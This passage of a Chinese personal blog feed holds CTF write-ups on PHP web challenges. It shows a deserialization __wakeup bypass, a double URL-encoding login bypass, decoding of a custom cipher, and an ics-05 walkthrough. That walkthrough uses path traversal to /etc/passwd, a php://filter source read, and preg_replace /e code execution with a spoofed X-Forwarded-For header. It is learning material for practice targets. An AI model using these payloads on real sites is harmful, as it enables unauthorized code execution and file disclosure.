  </entry>
  <entry>
    <title>2020903-PHP-PHP反序列化利用</title>
    <url>/2020/09/04/2020903-PHP-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="2020903-PHP-PHP反序列化利用"><a href="#2020903-PHP-PHP反序列化利用" class="headerlink" title="2020903-PHP-PHP反序列化利用"></a>2020903-PHP-PHP反序列化利用</h1><p>已经看了几天的反序列化了,稍微的做一个记录吧</p>
<p>序列化: 将缓存内容转换为可存储或者可传输的数据(对象持久化)<br>反序列化:将传输内容或存储内容转换为内存数据<br><img src="https://i.loli.net/2020/09/03/4BgRyLbFMzKe6wO.png" alt="image.png"></p>
<p>个人学习使用的环境:[极客大挑战 2019]PHP<br>1,下载网站备份 <a href="http://www.zip/">www.zip</a><br>获得文件<code>ndex.php class.php flag.php index.js style.css</code></p>
<p>分析像对应的源代码:<br>index.php 重要片段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="comment">//包涵class.php</span></span><br><span class="line">$select = $_GET[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="comment">//get一个传参</span></span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="comment">//unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>class.php</em></strong>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//创建类并进行对象构造</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//魔术方法:unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//魔术方法:</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">Note:</span> 如果子类中定义了构造函数则不会隐式调用其父类的构造函数。要执行父类的构造函数，需要在子类的构造函数中调用 </span></span><br><span class="line"><span class="comment">    parent::__construct()。如果子类没有定义构造函数则会如同一个普通的类方法一样从父类继承（假如没有被定义为 private 的话）。</span></span><br><span class="line"><span class="comment">    https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="comment">//如果password 不等于100 该程序退出 die()同等于exit()</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//username 等于admin 输出flag</span></span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>flag.php:无关键信息</code></p>
<p><strong><em>分析:</em></strong><br>这个只需要满足两个条件即可<br><code>password = 100</code><br><code>username = admin</code></p>
<p>然后需要绕过__wakeup<br>看上去方法很简单,<br>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p>
<p><strong><em>exp.php:</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class">   //构造<span class="title">Name</span>类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="comment">//申明私有对象$username </span></span><br><span class="line">        <span class="keyword">private</span> $password = <span class="number">100</span>;</span><br><span class="line">        <span class="comment">//申明私有对象$password</span></span><br><span class="line">&#125;</span><br><span class="line">$user = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="comment">//实体化对象Name()</span></span><br><span class="line">$str = urlencode(serialize($user));</span><br><span class="line"><span class="comment">//序列化并url编码$user</span></span><br><span class="line">var_dump($str);</span><br><span class="line"><span class="comment">//输出变量相关信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong><em>payload:</em></strong><br><code>?select=O%3A4%3A&quot;Name&quot;%3A3%3A%7Bs%3A14%3A&quot;%00Name%00username&quot;%3Bs%3A5%3A&quot;admin&quot;%3Bs%3A14%3A&quot;%00Name%00password&quot;%3Bi%3A100%3B%7D</code></p>
<p>这次仅是一个简单的学习发现自己缺php的内容太多了 ,看看就好</p>
<p>参考资料:<br>    <a href="https://www.php.net/manual/zh/function.unserialize.php">https://www.php.net/manual/zh/function.unserialize.php</a><br>    <a href="https://www.cnblogs.com/chbyl/p/7116591.html">https://www.cnblogs.com/chbyl/p/7116591.html</a><br>public: 公有类型<br>    在子类中可以通过self::var调用public方法或属性,parent::method调用父类方法<br>    在实例中可以能过$obj-&gt;var 来调用　public类型的方法或属性</p>
<p>protected: 受保护类型<br>    在子类中可以通过self::var调用protected方法或属性,parent::method调用父类方法<br>    在实例中不能通过$obj-&gt;var 来调用  protected类型的方法或属性</p>
<p>private: 私有类型<br>    该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能调用私有类型的属性和方法</p>
<p>2.self 和　parent 的区别<br>    a).在子类中常用到这两个对像。他们的主要区别在于self可以调用父类中的公有或受保护的属性，但parent不可以调用<br>     b).self:: 它表示当前类的静态成员(方法和属性)　与 $this　不同,$this是指当前对像</p>
]]></content>
      <categories>
        <category>PHP</category>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200907-XCTF-PHP2(URL二次编码)</title>
    <url>/2020/09/07/20200907-XCTF-PHP2-URL%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<h1 id="20200907-XCTF-PHP2-URL二次编码"><a href="#20200907-XCTF-PHP2-URL二次编码" class="headerlink" title="20200907-XCTF-PHP2(URL二次编码)"></a>20200907-XCTF-PHP2(URL二次编码)</h1><p>唉这题太草了,我自己的字典跑了半个小时的目录没结果,一看wp是index.phps (吐血<br><strong>index.phps</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里回对get传参进行一次url解码($_GET会默认解码一次(大约是这样的))</span></span><br><span class="line"><span class="comment">/*Warning</span></span><br><span class="line"><span class="comment">超全局变量 $_GET 和 $_REQUEST 已经被解码了。对 $_GET 或 $_REQUEST 里的元素使用 urldecode() 将会导致不可预计和危险的结果。*/</span></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>

<p>仔细一看超级简单的,只要urlencode两次就好了<br>结果用php编码半天就一直是admin草了<br>最后利用burp进行编码了两次就可了<br><img src="https://i.loli.net/2020/09/07/xH1XvD4A5MrnKOG.png" alt="image.png"></p>
<p>payload:<br><code>index.php?id=%2561%2564%256d%2569%256e</code></p>
<p>阅读资料:<br>    <a href="https://www.php.net/urldecode">https://www.php.net/urldecode</a></p>
]]></content>
      <categories>
        <category>PHP</category>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200924-xctf-WEB2-php解码</title>
    <url>/2020/09/24/20200924-xctf-WEB2-php%E8%A7%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="xctf-WEB2-php解码"><a href="#xctf-WEB2-php解码" class="headerlink" title="xctf WEB2 php解码"></a>xctf WEB2 php解码</h1><p>这是来自XCTF 攻防世界中的 web高级的一道题,某种意义上来说超级简单的</p>
<p><strong>index.php 页面:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"><span class="comment">//被加密的字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//每次取字符串$_o的首位</span></span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//转换成ASCII编码后加一</span></span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">        <span class="comment">//进行字符串拼接</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">    <span class="comment">//进行一次base64编码后反转字符串后进行一次ROT13编码</span></span><br><span class="line">    <span class="comment">//https://www.runoob.com/php/func-string-strrev.html</span></span><br><span class="line">    <span class="comment">//https://www.runoob.com/php/func-string-str-rot13.html</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>按上思路编写解码的php文件:<br>exp.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line">$str =  base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$_o = strrev($str);</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $_;</span><br><span class="line"><span class="comment">//代码几乎没变就是把+1变成了-1,同时把字符串编码的顺序换了一下</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>取得flag:<br><img src="https://i.loli.net/2020/09/24/JeKw68p2Qsf5B1N.png" alt="image.png"></p>
<p>参考资料:</p>
<p><a href="https://www.runoob.com/php/func-string-str-rot13.html">https://www.runoob.com/php/func-string-str-rot13.html</a></p>
<p><a href="https://www.runoob.com/php/func-string-strrev.html">https://www.runoob.com/php/func-string-strrev.html</a></p>
<p><a href="https://www.runoob.com/php/func-string-substr.html">https://www.runoob.com/php/func-string-substr.html</a></p>
]]></content>
      <categories>
        <category>PHP</category>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200924-PHP-XCTF-ics-05</title>
    <url>/2020/09/24/20200924-PHP-XCTF-ics-05/</url>
    <content><![CDATA[<h1 id="20200924-PHP-XCTF-ics-05文件包涵"><a href="#20200924-PHP-XCTF-ics-05文件包涵" class="headerlink" title="20200924-PHP-XCTF-ics-05文件包涵"></a>20200924-PHP-XCTF-ics-05文件包涵</h1><p>先检查页面找到了一个文件包涵点<br><a href="http://220.249.52.133:51253/index.php?page=../../../../../../../etc/passwd">http://220.249.52.133:51253/index.php?page=../../../../../../../etc/passwd</a><br><img src="https://i.loli.net/2020/09/24/MiC4THhoRlzw2OS.png" alt="image.png"></p>
<p>尝试了使用伪协议data无效<br>使用了 <code>?page=php://filter/read=convert.base64-encode/resource=index.php</code>读取到了源代码</p>
<p><img src="https://i.loli.net/2020/09/24/ujRl7W9mgkTirA8.png" alt="image.png"></p>
<p><strong>index.php(代码太长只取较为关键部分):</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctype_alnum($page)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">            &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//strpos()函数是区分大小写的</span></span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($page === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">include</span>($page);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                 <span class="comment">//尝试了半天使用data无果,寻找其他点</span></span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//检查xff头是否为 127.0.0.1</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">        <span class="comment">//preg_replace使用/e修饰符号可构建rec</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>preg_replace // 这个题的关键是利用文件包涵加伪协议读取index.php源代码,然后就是这个函数的利用</p>
<p>payload:<code>?pat=/123/e&amp;rep=highlight_file(&#39;s3chahahaDir/flag/flag.php&#39;)&amp;sub=123</code></p>
<p>利用远程命令执行查看目录内容并读取flag(需要修改xff头)<br><img src="https://i.loli.net/2020/09/24/YQmANxKBe75X9sJ.png" alt="image.png"></p>
<p>参考资料:</p>
<p><a href="https://www.runoob.com/php/php-preg_replace.html">https://www.runoob.com/php/php-preg_replace.html</a></p>
<p><a href="http://www.xinyueseo.com/websecurity/158.html">http://www.xinyueseo.com/websecurity/158.html</a></p>
]]></content>
      <categories>
        <category>PHP</category>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20201003-PHP-简单的练习</title>
    <url>/2020/10/03/20201003-PHP-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="20201003-PHP-简单的练习"><a href="#20201003-PHP-简单的练习" class="headerlink" title="20201003-PHP-简单的练习"></a>20201003-PHP-简单的练习</h1><p>输出一些相关信息,并根据代码行数来改变页面颜色,应该是写两个php文件的,思考了一番没必要.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;gbk&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;你好&#x27;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="meta">?&gt;</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前访问的文件:&quot;</span>.$_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件绝对地址:&quot;</span>.$_SERVER[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;服务器IP:&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;用户浏览器信息:&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;用户IP:&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前PHP文件位置在第&quot;</span>.<span class="keyword">__LINE__</span>.<span class="string">&quot;行&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//读取文件行数</span></span><br><span class="line">$filedir = $_SERVER[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>];</span><br><span class="line"><span class="comment">//较为标准的文件操作方式</span></span><br><span class="line">$File = fopen($filedir,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//feof() 检测是否以到达文件末尾行(按照php官方dome理解,可能为以行遍历文件直到结束)</span></span><br><span class="line"><span class="keyword">while</span>(!feof($File))&#123;</span><br><span class="line">        <span class="comment">//fgets() 函数从文件指针中读取一行。</span></span><br><span class="line">        <span class="keyword">if</span>(fgets($File))&#123;</span><br><span class="line">                $i++;</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line">fclose($File);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;该文件共记&quot;</span>.$i.<span class="string">&quot;行&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断代码行数来输出页面颜色</span></span><br><span class="line"><span class="keyword">if</span>($i&lt;=<span class="number">3</span>)&#123;</span><br><span class="line">$color = <span class="string">&quot;#DA70D6&quot;</span>;<span class="comment">//兰花的紫色</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>($i&gt;=<span class="number">4</span> &amp;&amp; $i&lt;=<span class="number">6</span>)&#123;</span><br><span class="line">$color = <span class="string">&quot;#00BFFF&quot;</span>;<span class="comment">//深天蓝</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>($i&gt;=<span class="number">7</span> &amp;&amp; $i&lt;=<span class="number">9</span>)&#123;</span><br><span class="line">$color = <span class="string">&quot;#90EE90&quot;</span>;<span class="comment">//淡绿色</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($i&gt;=<span class="number">10</span> &amp;&amp; $i&lt;=<span class="number">12</span>)&#123;</span><br><span class="line">$color = <span class="string">&quot;#000000&quot;</span>;<span class="comment">//纯黑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($i&gt;=<span class="number">13</span> &amp;&amp; $i&lt;=<span class="number">15</span>)&#123;</span><br><span class="line">$color = <span class="string">&quot;#800080&quot;</span>;<span class="comment">//紫色</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($i&gt;<span class="number">15</span>)&#123;</span><br><span class="line">$color = <span class="string">&quot;#39c5bb&quot;</span>;<span class="comment">//蓝绿</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;style&gt;body&#123;background-color:$color&#125;&lt;/style&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前页面颜色RGB颜色值:&#x27;</span>.$color;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>页面图片:<br><img src="https://i.loli.net/2020/10/03/IagfAsUbclXHJDP.png" alt="image.png"></p>
<p>其他的超全局的用法:<br>元素/代码    描述<br>$_SERVER[‘PHP_SELF’]    返回当前执行脚本的文件名。<br>$_SERVER[‘GATEWAY_INTERFACE’]    返回服务器使用的 CGI 规范的版本。<br>$_SERVER[‘SERVER_ADDR’]    返回当前运行脚本所在的服务器的 IP 地址。<br>$_SERVER[‘SERVER_NAME’]    返回当前运行脚本所在的服务器的主机名（比如 <a href="http://www.w3school.com.cn)./">www.w3school.com.cn）。</a><br>$_SERVER[‘SERVER_SOFTWARE’]    返回服务器标识字符串（比如 Apache/2.2.24）。<br>$_SERVER[‘SERVER_PROTOCOL’]    返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。<br>$_SERVER[‘REQUEST_METHOD’]    返回访问页面使用的请求方法（例如 POST）。<br>$_SERVER[‘REQUEST_TIME’]    返回请求开始时的时间戳（例如 1577687494）。<br>$_SERVER[‘QUERY_STRING’]    返回查询字符串，如果是通过查询字符串访问此页面。<br>$_SERVER[‘HTTP_ACCEPT’]    返回来自当前请求的请求头。<br>$_SERVER[‘HTTP_ACCEPT_CHARSET’]    返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1）<br>$_SERVER[‘HTTP_HOST’]    返回来自当前请求的 Host 头。<br>$_SERVER[‘HTTP_REFERER’]    返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。<br>$_SERVER[‘HTTPS’]    是否通过安全 HTTP 协议查询脚本。<br>$_SERVER[‘REMOTE_ADDR’]    返回浏览当前页面的用户的 IP 地址。<br>$_SERVER[‘REMOTE_HOST’]    返回浏览当前页面的用户的主机名。<br>$_SERVER[‘REMOTE_PORT’]    返回用户机器上连接到 Web 服务器所使用的端口号。<br>$_SERVER[‘SCRIPT_FILENAME’]    返回当前执行脚本的绝对路径。<br>$_SERVER[‘SERVER_ADMIN’]    该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。<br>$_SERVER[‘SERVER_PORT’]    Web 服务器使用的端口。默认值为 “80”。<br>$_SERVER[‘SERVER_SIGNATURE’]    返回服务器版本和虚拟主机名。<br>$_SERVER[‘PATH_TRANSLATED’]    当前脚本所在文件系统（非文档根目录）的基本路径。<br>$_SERVER[‘SCRIPT_NAME’]    返回当前脚本的路径。<br>$_SERVER[‘SCRIPT_URI’]    返回当前页面的 URI。</p>
<p>来自:<a href="https://www.w3school.com.cn/php/php_superglobals.asp">https://www.w3school.com.cn/php/php_superglobals.asp</a></p>
<p>feof():</p>
<p><img src="https://i.loli.net/2020/10/03/9PbcdvrIsEa25mZ.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>PHP</category>
        <category>PHP开发</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20201014-netcat学习记录</title>
    <url>/2020/10/17/20201014-netcat%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="20201014-netcat学习记录"><a href="#20201014-netcat学习记录" class="headerlink" title="20201014-netcat学习记录"></a>20201014-netcat学习记录</h1><p>// netcat 网络喵  一只强大的网络喵</p>
